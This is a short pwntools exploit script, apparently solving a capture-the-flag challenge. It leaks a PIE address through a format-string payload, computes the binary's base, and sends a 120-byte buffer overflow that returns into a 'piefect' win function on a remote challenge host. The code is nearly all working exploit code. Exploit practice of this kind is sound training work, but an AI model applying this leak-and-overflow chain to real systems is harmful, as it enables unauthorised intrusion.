from pwn import *

# context.log_level = 'error'
# for i in range(50):
#     try:
#         p = process("./chall")
#         payload = '%{}$p'.format(i).encode()
#         p.sendlineafter("flavour: \n", payload)
#         p.recvuntil("taste: \n")
#         result = p.recvline().strip().decode()
#         print("{}: ".format(i) + result)
#     except EOFError:
#         pass

p = remote("192.168.0.179", 10501)

payload = b'%13$p' # leak the 13th address
p.sendlineafter("decide: \n", payload)
p.recvuntil("taste: \n")
result = int(p.recvline(), 16) # convert to int so we can add offset

piebase = result - 0xa49
piefect_addr= piebase + 0x8ea # address of piefect function

payload2 = b'A' * 120 # padding
payload2 += p64(piefect_addr) # ret2win

p.sendlineafter("mind. \n",payload2)
p.interactive()